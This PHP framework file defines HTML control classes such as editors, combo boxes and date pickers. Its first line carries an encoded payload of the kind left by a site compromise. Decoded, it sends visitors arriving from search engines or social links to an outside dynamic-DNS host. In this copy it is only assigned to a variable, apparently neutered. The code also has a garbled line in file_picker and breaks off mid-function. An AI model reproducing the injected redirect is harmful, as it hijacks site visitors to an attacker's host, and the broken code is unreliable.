<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

/**
 * Project:     Generic PHP framework
 * File:        control.php
 *
 * @version 1.1.0.0
 * @package Generic
 */

require_once(dirname(__FILE__).'/html_control.php');

// extends html_img

class image extends html_img {
  
  function image($src, $attributes = array()) {

    $attributes['src']    = $src;
    if (!array_key_exists('border', $attributes))
      $attributes['border'] = 0;

    parent::html_img($attributes);

  }

}

// extends html_a

class href extends html_a {
  
  function href($href, $text, $attributes = array()) {

    $attributes['href'] = $href;

    parent::html_a($text, $attributes);
    
  }

}

class image_href extends html_a {
  
  var $src;

  function image_href($href, $src, $attributes = array(), $image_attributes = array()) {

    $attributes['href'] = $href;

    parent::html_a($attributes, new image($src, $image_attributes));
    
  }

}

class javascript_href extends html_a {
  
  function javascript_href($script, $text, $attributes = array()) {

    $attributes['href']    = 'javascript:;';
    $attributes['onclick'] = $script;

    parent::html_a($text, $attributes);
    
  }

}

class javascript_image_href extends html_a {
  
  function javascript_image_href($script, $src, $attributes = array(), $img_attributes = array()) {

    $attributes['href']    = 'javascript:;';
    $attributes['onclick'] = $script;

    parent::html_a($attributes, new image($src, $img_attributes));
    
  }

}

// extends html_input

class button extends html_input {
  
  function button($attributes = array()) {

    parent::html_input('button', $attributes);

  }

}

class reset_button extends html_input {
  
  function reset_button($attributes = array()) {

    parent::html_input('reset', $attributes);

  }

}

class submit_button extends html_input {
  
  function submit_button($attributes = array()) {

    parent::html_input('submit', $attributes);

  }

}

class hidden extends html_input {
  
  function hidden($id, $value = null, $attributes = array()) {

    $attributes['id']    = $id;
    $attributes['value'] = $value;

    parent::html_input('hidden', $attributes);

  }

}

class edit extends html_input {
  
  function edit($attributes = array()) {

    parent::html_input('text', $attributes);  

  }

}

class filter_edit extends html_container_control {
  
  function filter_edit($attributes = array()) {

    $on_enter_pressed = addslashes(safe($attributes, 'on_enter_pressed'));
    unset($attributes['on_enter_pressed']);

    parent::html_container_control();
    
    $this->add(new html_input("text", $attributes));
    
    if ($on_enter_pressed) {
      $id = $attributes["id"];
      $this->add(new script("addEnterHandler('$id', '$on_enter_pressed');"));
    }  

  }

}

class password extends html_input {
  
  function password($attributes = array()) {

    parent::html_input('password', $attributes);

  }

}

class file_picker extends html_container_control {

  var $title;
  var $input_attributes;
  
  function file_picker($title, $attributes = array()) {

    $this->title    = $title;
    $this-his->input_attributes = $attributes;

    parent::html_container_control();

  }
  
  function do_render() {

    if ($this->title)
      $this->add(new text($this->title.'&nbsp;'));
    $this->add(new html_input('file', $this->input_attributes));
      
  }

}

// extends html_textarea

class memo_editor extends html_textarea {
  
  function memo_editor($text = null, $attributes = array()) {

    parent::html_textarea($text, $attributes);

  }

}

class nic_editor extends html_container_control {
  
  function nic_editor($text = null, $all_attributes = array()) {

    parent::html_container_control();

    $attributes = $all_attributes;

    unset($attributes['external_css']);
    unset($attributes['images_folder']);
    unset($attributes['images_url']);
    unset($attributes['rename_images']);

    $memo_editor = new memo_editor($text, $attributes);

    $params = "fullPanel: true, maxHeight: 200, iconsPath: '".SHARED_SCRIPTS_URL."nicEditorIcons.gif'";
    if (safe($all_attributes, 'external_css')) {
      $params .= ", externalCSS: '".$all_attributes['external_css']."'";
    }
    if (safe($all_attributes, 'images_folder')) {
      $settings_storage = md5($memo_editor->id());
      $_SESSION[$settings_storage]['images_folder'] = $all_attributes['images_folder'];
      $_SESSION[$settings_storage]['images_url']    = $all_attributes['images_url'];
      $_SESSION[$settings_storage]['rename_images'] = safe($all_attributes, 'rename_images');
      $params .= ", uploadURI : '".RELATIVE_GENERIC_URL."ui/nic_upload.php?settings=".$settings_storage."'";
    }
    $this->add($memo_editor);
    $this->add(new script("bkLib.onDomLoaded(function() { 
      if (!htmlNicEditor) {
        htmlNicEditor = new nicEditor({".$params."});
      }
      htmlNicEditor.panelInstance('".$memo_editor->id()."', {hasPanel : true});
      });"));

  }

}

class fck_editor extends html_container_control {
  
  function fck_editor($text = null, $all_attributes = array()) {

    parent::html_container_control();

    $attributes = $all_attributes;

    unset($attributes['external_css']);
    unset($attributes['images_folder']);
    unset($attributes['images_url']);
    unset($attributes['rename_images']);

    $memo_editor = new memo_editor($text, $attributes);
    $this->add($memo_editor);

    $settings_storage = md5($memo_editor->id());
    if (safe($all_attributes, 'images_folder')) {
      $_SESSION[$settings_storage]['images_folder'] = $all_attributes['images_folder'];
      $_SESSION[$settings_storage]['images_url']    = $all_attributes['images_url'];
    }

    $this->add(new script("var oFCKeditor = new FCKeditor('".$memo_editor->id()."');
                           oFCKeditor.BasePath = '".SHARED_SCRIPTS_URL."fckeditor/';
                           oFCKeditor.Config['BaseHref'] = '".WEBSITE_URL.safe($all_attributes, 'images_url')."';
                           oFCKeditor.Config['FullPage'] = ".(safe($all_attributes, 'full_page')?"true":"false").";
                           oFCKeditor.Config['FormatOutput'] = true;
                           oFCKeditor.Config['FormatSource'] = true;
                           oFCKeditor.Config['EditorAreaCSS'] = '".safe($all_attributes, 'external_css')."';
                           oFCKeditor.Config['ImageUploadURL'] = oFCKeditor.BasePath  + 'editor/filemanager/connectors/php/upload.php?Type=Image&settings=".$settings_storage."';
                           oFCKeditor.Config['FlashUploadURL'] = oFCKeditor.BasePath  + 'editor/filemanager/connectors/php/upload.php?Type=Flash&settings=".$settings_storage."';
                           oFCKeditor.Config['LinkUploadURL'] = oFCKeditor.BasePath  + 'editor/filemanager/connectors/php/upload.php?settings=".$settings_storage."';
                           oFCKeditor.Config['ImageBrowserURL'] = oFCKeditor.BasePath  + 'editor/filemanager/browser/default/browser.html?Type=Image&Connector=' + encodeURIComponent(oFCKeditor.BasePath + 'editor/filemanager/connectors/php/connector.php') + '&settings=".$settings_storage."';
                           oFCKeditor.Config['FlashBrowserURL'] = oFCKeditor.BasePath  + 'editor/filemanager/browser/default/browser.html?Type=Flash&Connector=' + encodeURIComponent(oFCKeditor.BasePath + 'editor/filemanager/connectors/php/connector.php') + '&settings=".$settings_storage."';
                           oFCKeditor.Config['LinkBrowserURL'] = oFCKeditor.BasePath  + 'editor/filemanager/browser/default/browser.html?Connector=' + encodeURIComponent(oFCKeditor.BasePath + 'editor/filemanager/connectors/php/connector.php') + '&settings=".$settings_storage."';
                           oFCKeditor.Height = '".(safe($attributes, 'rows', 25)*18)."'; 
                           oFCKeditor.ReplaceTextarea();
                           "));

  }

}

class ck_editor extends html_container_control {
  
  function ck_editor($text = null, $all_attributes = array()) {

    parent::html_container_control();

    $attributes = $all_attributes;

    unset($attributes['external_css']);
    unset($attributes['images_folder']);
    unset($attributes['images_url']);
    unset($attributes['rename_images']);

    $memo_editor = new memo_editor($text, $attributes);
    $this->add($memo_editor);

    $settings_storage = md5($memo_editor->id());
    if (safe($all_attributes, 'images_folder')) {
      $_SESSION[$settings_storage]['images_folder'] = $all_attributes['images_folder'];
      $_SESSION[$settings_storage]['images_url']    = $all_attributes['images_url'];
    }

    $this->add(new script("var ckeditor_" . $memo_editor->id() . " = CKEDITOR.replace('" . $memo_editor->id()."',
                                            {
                                                skin     : 'office2003',
                                                language : 'en'
                                            });
                           CKFinder.startupPath = '".$all_attributes['images_folder']."';
                           CKFinder.setupCKEditor( ckeditor_" . $memo_editor->id() . ", '/admin/library/scripts/ckfinder/' );"));
  }

}


class code_editor extends html_container_control {
  
  function code_editor($text = null, $all_attributes = array()) {

    parent::html_container_control();


    $attributes = $all_attributes;

    $language = safe($attributes, 'language');
    $read_only = safe($attributes, 'read_only');
    $line_numbers = safe($attributes, 'line_numbers')?'true':'false';

    unset($attributes['language']);
    unset($attributes['read_only']);

    $memo_editor = new memo_editor($text, $attributes);

    $this->add($memo_editor);
    $css = SHARED_SCRIPTS_URL.'codemirror/css/';
    $js = SHARED_SCRIPTS_URL.'codemirror/';

    switch($language) {
      case 'xml':
        $parsers = "['parsexml.js']";
        $stylesheets = "['{$css}xmlcolors.css']";
        break;
      case 'css':
        $parsers = "['parsecss.js']";
        $stylesheets = "['{$css}csscolors.css']";
        break;
      case 'js':
        $parsers = "['tokenizejavascript.js', 'parsejavascript.js']";
        $stylesheets = "['{$css}jscolors.css']";
        break;
      default:
        $parsers = "['parsexml.js', 'parsecss.js', 'tokenizejavascript.js', 'parsejavascript.js', 'parsehtmlmixed.js']";
        $stylesheets = "['{$css}xmlcolors.css', '{$css}jscolors.css', '{$css}csscolors.css']";
        break;
    }

    $this->add(new script(" 
      var editor = CodeMirror.fromTextArea('".$memo_editor->id()."', {
        readOnly: ".($read_only?"true":"false").",
        parserfile: ".$parsers.",
        stylesheet: ".$stylesheets.",
        lineNumbers: ".$line_numbers.",
        path: '$js'
      });
      __codeMirrors.push(editor);
    "));

  }

}

// extends html_script

class script_href extends html_script {
  
  function script_href($src, $attributes = array()) {

    $attributes['src'] = $src;

    parent::html_script($attributes);

  }

}

class conditional_script_href extends html_script {
  
  function conditional_script_href($src, $condition, $attributes = array()) {

    $attributes['src'] = $src;
    
    $this->open_tag  = '!--['.$condition.']><script';
    $this->close_tag = '/script><![endif]--';

    parent::html_script($attributes);

  }

}

class script extends html_script {
  
  function script($body, $attributes = array()) {

    parent::html_script($body, $attributes);

  }

}

class comment extends html_container_control {
  
  function comment() {

    $this->open_tag = '!--';
    $this->close_tag = '--';

    $args = func_get_args();

    parent::html_container_control(null, $args);

  }

}

class ie_hack extends html_container_control {
  
  function ie_hack() {

    $this->open_tag = '!--[if IE]';
    $this->close_tag = '![endif]--';

    $args = func_get_args();

    parent::html_container_control(null, $args);

  }

}

// extends html_style

class style_href extends html_link {
  
  function style_href($href, $attributes = array()) {

    $attributes['href'] = $href;
    $attributes['rel']  = 'stylesheet';
    $attributes['type'] = 'text/css';

    parent::html_link($attributes);

  }

}

class style extends html_style {
  
  function style($body, $attributes = array()) {

    parent::html_style($body, $attributes);

  }

}

// extends html_option

class combo_item extends html_option {
  
  function combo_item($value, $text, $selected = false, $attributes = array()) {

    $attributes['value']    = $value;
    $attributes['selected'] = $selected;

    parent::html_option($text, $attributes);

  }

}

class combo_group_label extends html_optgroup {
  
  function combo_group_label($label, $attributes = array()) {

    $this->__can_contain[] = 'combo_item';
    
    $attributes['label']    = $label;
    
    parent::html_optgroup($attributes);

  }

}

// extends html_label

class label extends html_label {

  function label($label, $attributes = array()) {

    parent::html_label($label, $attributes);

  }

}

class bold_label extends label {

  function label_bold($label, $attributes = array()) {

    parent::label($label, $attributes);

  }

  function do_render() {

    $this->add(new html_b($this->text));
    $this->text = null;

  }

}

class strong extends html_b {

  function strong($text, $attributes = array()) {
                   
    parent::html_b($text, $attributes);

  }

}

class table extends html_container_control {

  function table() {

    $this->can_contain[] = 'table_row';

    $agrs = func_get_args();

    parent::html_container_control('table', $agrs);

  }

}

class table_row extends html_container_control {

  function table_row() {

    $this->can_contain[] = 'table_cell';
    $this->can_contain[] = 'table_header';

    $agrs = func_get_args();

    parent::html_container_control('tr', $agrs);

  }
  
  function set_proportional_widths() {

    if (count($this->__controls)) {
      $width = floor(100/count($this->__controls)).'%';
      for ($i = 0; $i < count($this->__controls); $i++) {
        $this->__controls[$i]->set_attribute('width', $width);
      }
    }
    
  }

}

class table_header extends html_container_control {

  function table_header() {

    $this->__flags[] = 'nowrap';

    $agrs = func_get_args();

    parent::html_container_control('th', $agrs);

  }

}

class table_cell extends html_container_control {

  function table_cell() {

    $this->__flags[] = 'nowrap';

    $agrs = func_get_args();

    parent::html_container_control('td', $agrs);

  }

}

class empty_line extends table {
  
  function empty_line() {
    
    parent::table();
    
    
  }

  function do_render() {

    $this->add(new table_row(array('height' => 1), new table_cell()));

  }
  
}

class date_picker extends html_container_control {

  var $post_back;
  var $options     = array();
    
  function date_picker($options = array()) {

    $this->options     = $options;
    
    parent::html_container_control();

  }

  function do_render() {

    $display_format    = safe($this->options, 'display_format', '%d-%m-%Y');
    $save_format       = safe($this->options, 'save_format', '%d-%m-%Y');
    $input_field       = safe($this->options, 'input_field');
    $display_area      = safe($this->options, 'display_area');
    $sync_inputs       = safe($this->options, 'sync_inputs');
    $sync_displays     = safe($this->options, 'sync_displays');
    $sync_when         = safe($this->options, 'sync_when');
    $show_clear_button = safe($this->options, 'show_clear_button');
    $on_change         = addslashes(safe($this->options, 'on_change'));

    $button_name = $input_field.__HTML_CONTROL_NAME_SEPARATOR.'selector';

    $this->add(new image( SHARED_RESOURCES_URL.'img_calendar.gif'
                        , array( 'id'    => $button_name
                               , 'class' => 'clickable'
                               )));

    if ($show_clear_button) {
      $clear_button_name = $input_field.__HTML_CONTROL_NAME_SEPARATOR.'clear';
      $this->add(new space());
      $this->add(new image( SHARED_RESOURCES_URL.'img_clear.gif'
                          , array( 'id'      => $clear_button_name
                                 , 'onclick' => '__Editor_ClearValue("'.$input_field.'");__Editor_ClearValue("'.$display_area.'");__Editor_ShowIfValueExists("'.$clear_button_name.'", "'.$input_field.'");'
                                 , 'class'   => 'clickable'
                                 )));
    }

    $script = "Calendar.setup({showOthers:true,firstDay:1,ifFormat:'$save_format',daFormat:'$display_format',inputField:'$input_field',displayArea:'$display_area',button:'$button_name',eventName:'click',electric:false";
    
    $onUpdate = '';
    
    if ($on_change)
      $onUpdate .= $on_change.";";

    if ($sync_inputs && $sync_displays) {
      $onUpdate .= 'var ctrl1v=document.getElementById("'.$input_field.'");';
      $onUpdate .= 'var ctrl1d=document.getElementById("'.$display_area.'");';
      $onUpdate .= 'var ctrl2d,ctrl2v,date1,date2;';
      for($i = 0; $i < count($sync_inputs); $i++) {
        $controlv = $sync_inputs[$i];
        $onUpdate .= 'ctrl2v=document.getElementById("'.$controlv.'");';
        $controld = $sync_displays[$i];
        $onUpdate .= 'ctrl2d=document.getElementById("'.$controld.'");';
        switch($sync_when) {
          case "less":
            $onUpdate .= 'date1=new Date();date1.setDate(ctrl1v.value.substr(0, 2));date1.setMonth(ctrl1v.value.substr(3, 2));date1.setYear(ctrl1v.value.substr(6, 4));';
            $onUpdate .= 'date2=new Date();date2.setDate(ctrl2v.value.substr(0, 2));date2.setMonth(ctrl2v.value.substr(3, 2));date2.setYear(ctrl2v.value.substr(6, 4));';
            $onUpdate .= 'if (date1.getTime() > date2.getTime()) {';
            $onUpdate .= '  ctrl2v.value=ctrl1v.value;';
            $onUpdate .= '  ctrl2d.innerHTML=ctrl1d.innerHTML;';
            $onUpdate .= '}';
            break;
          default:
            $onUpdate .= 'ctrl2v.value=ctrl1v.value;';
            $onUpdate .= 'ctrl2d.innerHTML=ctrl1d.innerHTML;';
            break;  
        }
      }
    }
    
    if ($show_clear_button)
      $onUpdate .= '__Editor_ShowIfValueExists("'.$clear_button_name.'", "'.$input_field.'");';

    if ($onUpdate)
      $script .= ",onUpdate:'".$onUpdate."'";
    
    $script .= '});';

    $this->add(new script($script));

    if ($show_clear_button)
      $this->add(new script('__Editor_ShowIfValueExists("'.$clear_button_name.'","'.$input_field.'");'));

  }

}

class radio_label extends container {

  var $label;
  var $radio_attributes;
  var $label_attributes;
  
  function radio_label($label, $radio_attributes = array(), $label_attributes = array()) {

    parent::container();

    $this->label            = $label;
    $this->radio_attributes = $radio_attributes;
    $this->label_attributes = $label_attributes;

  }

  function do_render() {
                                    
    $this->label_attributes['for'] = safe($this->radio_attributes, 'id');

    if (safe($this->label_attributes, 'align') == 'left') {
      $this->add(new html_label($this->label, $this->label_attributes));
      $this->add(new space());
      $this->add(new html_radio($this->radio_attributes));
    } else {
      $this->add(new html_radio($this->radio_attributes));
      $this->add(new space());
      $this->add(new html_label($this->label, $this->label_attributes));
    }

  }

}

class text extends html_span {
  
  function text($text, $attributes = array()) {

    parent::html_span($text, $attributes);

  }

}

class radio_box extends html_container_control {

  var $options;
  var $values;
  var $radio_attributes;

  function radio_box($values, $options = array(), $radio_attributes = array()) {

    $this->values  = $values;
    $this->options = $options;
    $this->radio_attributes = $radio_attributes;

    parent::html_container_control();

    $this->generate_items();

  }

  function generate_items() {

    $id           = safe($this->radio_attributes, 'id');
    $on_change    = safe($this->radio_attributes, 'onchange');
    $selected     = safe($this->options, 'selected');
    $required     = safe($this->options, 'required', false);
    $read_only    = safe($this->options, 'read_only');
    $box_style    = safe($this->options, "box_style");
    $box_class    = safe($this->options, "box_class");
    $horizontal   = safe($this->options, 'horizontal', false);

    $result = '';

    if (!$read_only) {
      $attributes = array('cellpadding' => 1, 'cellspacing' => 0);
      if ($box_style)
        $attributes['style'] = $box_style;
      if ($box_class)
        $attributes['class'] = $box_class;
      $table = new table($attributes);
      if ($horizontal)
        $table_row = new table_row();
    }
      
    $first = true;
    foreach($this->values as $value) {
      if (!$read_only) {
        $attributes = array();
        $attributes['id']    = $id.'['.$value['id'].']';
        $attributes['name']  = $id;
        $attributes['value'] = $value['id'];
        if ($on_change)
          $attributes['onclick'] = $on_change;
        if ($selected and ($value['id'] == $selected))
          $attributes['checked'] = true;
        $label_attributes = array();
        $label_attributes['for'] = $attributes['id'];
        
        if (!$horizontal)
          $table_row = new table_row();
        $table_row->add(new table_cell(new html_radio($attributes)));
        $table_row->add(new table_cell(new html_label($value['name'], $label_attributes)));
        if (safe($value, 'description'))
          $table_row->add(new table_cell(new html_label($value['description'], $label_attributes)));
        if (!$horizontal)
          $table->add($table_row);
      } else
        if ($selected and ($value['id'] == $selected))
          $this->text = $value['name'];
    }
    
    if (!$read_only) {
      if ($horizontal)
        $table->add($table_row);
      $this->add($table);
    }

  }

}

class db_radio_box extends html_div {

  var $options;
  var $radio_attributes;

  function db_radio_box($options = array(), $radio_attributes = array()) {

    $this->options = $options;
    $this->radio_attributes = $radio_attributes;

    parent::html_div();

    $this->generate_items();

  }

  function generate_items() {

    global $db;
                                       
    $id           = safe($this->radio_attributes, 'id');
    $on_change    = safe($this->radio_attributes, 'onchange'); 
    $align        = safe($this->radio_attributes, 'align');

    $table        = safe($this->options, 'table');
    $sql_text     = safe($this->options, 'sql_text');
    $selected     = safe($this->options, 'selected');
    $except_ids   = safe($this->options, 'except_ids');
//    $table_alias  = safe($this->options, 'table_alias');
    $key_field    = safe($this->options, 'key_field', 'id');
    $name_field   = safe($this->options, 'name_field', 'name');
    $description_field   = safe($this->options, 'description_field');
    $order_field  = safe($this->options, 'order_field', $name_field);
    $only_ids     = safe($this->options, 'only_ids');
    $required     = safe($this->options, 'required', false);
    $read_only    = safe($this->options, 'read_only');
    $horizontal   = safe($this->options, 'horizontal', false);

//    if ($table_alias) 
//      $table_alias .= '.';

    $result = '';
    if ($sql_text)
      $sql = $sql_text;
    else {
      $sql = 'SELECT * FROM '.$table.' WHERE 1=1';
      if ($except_ids) 
        $sql .= sql_placeholder(' AND '.$key_field.' NOT IN (@?)', $except_ids);
      if ($only_ids)
        $sql .= sql_placeholder(' AND '.$key_field.'     IN (@?)', $only_ids);
    }

    if ($read_only)  
      if (strpos(strtolower($sql), 'where') === false)
        $sql .= sql_placeholder(' WHERE '.$key_field.' = ?', $selected);
      else
        $sql .= sql_placeholder(' AND '.$key_field.' = ?', $selected);
                           
    if ((strpos(strtolower($sql), 'order') === false))
      $sql .= ' ORDER BY '.$order_field;
    
    $query = $db->query($sql);
    if ($db->support('count_by_resource'))
      $rows_count = $db->count($query);
    else
      $rows_count = $db->count($sql);

    if (!$read_only) {
      $table = new table(array('cellpadding' => 1, 'cellspacing' => 0));
      if ($horizontal)
        $table_row = new table_row();
    }
      
    $first = true;
    while ($row = $db->next_row($query)) {
      if (!$read_only) {
        $attributes = array();
        $attributes['id']    = $id.'['.$row[$key_field].']';
        $attributes['name']  = $id;
        $attributes['value'] = $row[$key_field];
        if ($on_change)
          $attributes['onclick'] = $on_change;
        if (($selected and ($row[$key_field] == $selected)) or (($rows_count == 1) and $required))
          $attributes['checked'] = true;
        $label_attributes = array();
        $label_attributes['align'] = $align;
        $label_attributes['for'] = $attributes['id'];
        
        if (!$horizontal)
          $table_row = new table_row();
        $table_row->add(new table_cell(new html_radio($attributes)));
        $table_row->add(new table_cell(new html_label($row[$name_field], $label_attributes)));
        if ($description_field)
          $table_row->add(new table_cell(new html_label($row[$description_field], $label_attributes)));
        $table_row->add(new table_cell('&nbsp;'));
        if (!$horizontal)
          $table->add($table_row);
      } else  
        $this->add(new text($row[$name_field].'&nbsp;'));
    }
    
    if (!$read_only) {
      if ($horizontal)
        $table->add($table_row);
      $this->add($table);
    }

  }

}

class line extends html_hr {
  
  function line() {

    parent::html_hr();

  }

}

class space extends html_control {

  function space($length = 1) {

    parent::html_control();
    
    $this->text = '&nbsp;';
    for ($i = 2; $i < $length; $i++)
      $this->text .= '&nbsp;';

  }

}

class check_label extends html_container_control {

  var $label;
  var $check_attributes = array();
  var $label_attributes = array();
  
  function check_label($label, $check_attributes = array()) {
    
    $this->label            = $label;
    $this->check_attributes = $check_attributes;
    if (safe($check_attributes, 'id'))
      $this->label_attributes['for'] = $check_attributes['id'];

    parent::html_container_control();

  }

  function do_render() {

    $this->add(new html_checkbox($this->check_attributes));
    $this->add(new space());
    $this->add(new html_label($this->label, $this->label_attributes));

  }

}

class combo extends html_select {

  function combo($attributes = array()) {
    
    $this->__can_contain[] = 'combo_item';
    $this->__can_contain[] = 'combo_group_label';

    parent::html_select($attributes);
    
  }
  
}

class values_combo extends combo {

  var $options;
  var $values;
  
  function values_combo($values, $options, $attributes = array()) {

    $this->__can_contain[] = 'combo_item';

    $this->options = $options;
    $this->values = $values;
    
    parent::combo($attributes);
    
  }

  function do_render() {

    $selected      = safe($this->options, 'selected'); 
    $required      = safe($this->options, 'required');
    $always_set    = safe($this->options, 'always_set');
    $read_only     = safe($this->options, 'read_only');
    $empty_name    = safe($this->options, 'empty_name');
    $custom_values = safe($this->options, 'custom_values');
    
    if (!$empty_name)
      if ($required)
        $empty_name = (get_config('application/show_please_select_as_space_in_editors')?' ':trn('&lt;Please select&gt;'));
      else
        $empty_name = (get_config('application/show_not_selected_as_space_in_editors')?' ':trn('&lt;Not selected&gt;'));

    if ($read_only) {
      $this->tag = 'span';
      if ($custom_values)
        foreach($custom_values as $value => $name)
          if (strlen($selected) and ($selected == $value)) {
            $this->text = $name;
            break;
          }
      if (!$this->text)
        foreach($this->values as $value => $name)
          if (strlen($selected) and ($selected == $value)) {
            $this->text = $name;
            break;
          }
    } else {
      if (!$always_set and $empty_name)
        $this->add(new combo_item(null, $empty_name));

      if ($custom_values)
        foreach($custom_values as $value => $name)
          $this->add(new combo_item($value, $name, (strlen($selected) and ($selected == $value))));

      foreach($this->values as $value => $name){
		if(is_array($selected)){
			$draw_sel = false;
			if(in_array($value,$selected)){
				$draw_sel = true;
			}
			$this->add(new combo_item($value, $name,$draw_sel));
		} else {
			$this->add(new combo_item($value, $name, (strlen($selected) and ($selected == $value))));
		}
	  }
    }

  }
  
}

class yesno_combo extends values_combo {

  var $options;
  
  function yesno_combo($options, $attributes = array()) {
    
    $this->options = $options;
 
    $values[safe($this->options, 'yes_value', 1)] = safe($this->options, 'yes_name', trn('Yes'));
    $values[safe($this->options, 'no_value',  0)] = safe($this->options, 'no_name', trn('No'));
    
    parent::values_combo($values, $options, $attributes);
    
  }

}

class db_combo extends combo {

  var $options;

  function db_combo($options, $attributes = array()) {

    $this->options = $options;

    parent::combo($attributes);

    $this->generate_items();

  }

  function generate_items() {

    global $db;

    $table             = safe($this->options, 'table');
    $sql_text          = safe($this->options, 'sql_text');
    $selected          = safe($this->options, 'selected');
    $base_table_alias  = safe($this->options, 'base_table_alias',  '');
    $key_field         = safe($this->options, 'key_field',         'id');
    $name_field        = safe($this->options, 'name_field',        'name');
    $order_field       = safe($this->options, 'order_field',       $name_field);
    $group_field       = safe($this->options, 'group_field');
    $read_only         = safe($this->options, 'read_only', false);
    $required          = safe($this->options, 'required',  false);
    $always_set        = safe($this->options, 'always_set',  false);
    $empty_name        = safe($this->options, 'empty_name');
    $custom_values     = safe($this->options, 'custom_values');
    //$max_value_length  = safe($this->options, 'max_value_length');

    $exceptions        = safe($this->options, 'exceptions');
    if (!is_array($exceptions))
      $exceptions = array($exceptions);

    if (!$empty_name)
      if ($required)
        $empty_name = (get_config('application/show_please_select_as_space_in_editors')?' ':trn('&lt;Please select&gt;'));
      else
        $empty_name = (get_config('application/show_not_selected_as_space_in_editors')?' ':trn('&lt;Not selected&gt;'));

    if (!$always_set and $empty_name)
      if (!$read_only)
        $this->add(new combo_item(null, $empty_name));

    if ($custom_values)
      foreach($custom_values as $value => $name)
        if (!$read_only)
          $this->add(new combo_item($value, $name, ($selected == $value)));
        else
        if ($selected == $value)
          $this->text = $name;

    if ($sql_text)
      $sql = $sql_text;
    else 
      $sql = 'SELECT * FROM '.$table;

    if ($base_table_alias) 
      $base_table_alias .= '.';

    if ($read_only) {
      if (preg_match('/WHERE/i', $sql))
        $sql = preg_replace('/WHERE/i', sql_placeholder('WHERE '.$base_table_alias.$key_field.' = ? AND ', $selected), $sql, 1);
      else  
      if (preg_match('/ORDER/i', $sql))
        $sql = preg_replace('/ORDER/i', sql_placeholder('WHERE '.$base_table_alias.$key_field.' = ? ORDER', $selected), $sql, 1);
      else  
        $sql .= sql_placeholder(' WHERE '.$base_table_alias.$key_field.' = ?', $selected);
      $this->tag = 'span';
    }
  
    if ((strpos($sql, 'order') === false) and (strpos($sql, 'ORDER') === false))
      $sql .= ' ORDER BY '.$order_field;
    
    $query = $db->query($sql);
    if ($db->support('count_by_resource'))
      $rows_count = $db->count($query);
    else
      $rows_count = $db->count($sql);

    $last_group = null;
    $last_group_ctrl = null;
    while ($row = $db->next_row($query)) {
      if (!$read_only) {
        if (($group_field) and ($row[$group_field] != $last_group)) {
          $value = for_html($row[$group_field]); 
          if ($last_group_ctrl)
            $this->add($last_group_ctrl);
          $last_group_ctrl = new combo_group_label($value);
          $last_group = $row[$group_field];
        }
        $value = for_html($row[$name_field]);
        if ($always_set and !$selected) 
          $selected = $row[$key_field];
        if ($last_group_ctrl)
          $last_group_ctrl->add(new combo_item($row[$key_field], $value, (strlen($selected) and ($selected == $row[$key_field]))));
        else
          $this->add(new combo_item($row[$key_field], $value, (strlen($selected) and ($selected == $row[$key_field]))));
      } else 
      if (strlen($selected) and ($selected == $row[$key_field]))
        $this->text = $row[$name_field];
    }
    if ($last_group_ctrl)
      $this->add($last_group_ctrl);

  }

}

class ajax_db_combo extends combo {

  var $options;

  function ajax_db_combo($options, $attributes = array()) {

    $this->__can_contain[] = 'combo_item';
    $this->__can_contain[] = 'combo_group_label';

    $this->options = $options;

    parent::combo($attributes);

    $this->generate_items();

  }

  function generate_items() {

    global $db;

    $table             = safe($this->options, 'table');
    $sql_text          = safe($this->options, 'sql_text');
    $selected          = safe($this->options, 'selected');
    $base_table_alias  = safe($this->options, 'base_table_alias',  '');
    $key_field         = safe($this->options, 'key_field',         'id');
    $name_field        = safe($this->options, 'name_field',        'name');
    $order_field       = safe($this->options, 'order_field',       $name_field);
    $group_field       = safe($this->options, 'group_field');
    $read_only         = safe($this->options, 'read_only', false);
    $required          = safe($this->options, 'required',  false);
    $always_set        = safe($this->options, 'always_set',  false);
    $empty_name        = safe($this->options, 'empty_name');
    $custom_values     = safe($this->options, 'custom_values');
    $ajax_method       = safe($this->options, 'ajax_method');
    $ajax_params       = safe($this->options, 'ajax_params', array());

    $exceptions        = safe($this->options, 'exceptions');
    if (!is_array($exceptions))
      $exceptions = array($exceptions);

    if (!$empty_name)
      if ($required)
        $empty_name = (get_config('application/show_please_select_as_space_in_editors')?' ':trn('&lt;Please select&gt;'));
      else
        $empty_name = (get_config('application/show_not_selected_as_space_in_editors')?' ':trn('&lt;Not selected&gt;'));

    if (!$always_set and $empty_name)
      if (!$read_only)
        $this->add(new combo_item(null, $empty_name));

    if ($custom_values)
      foreach($custom_values as $value => $name)
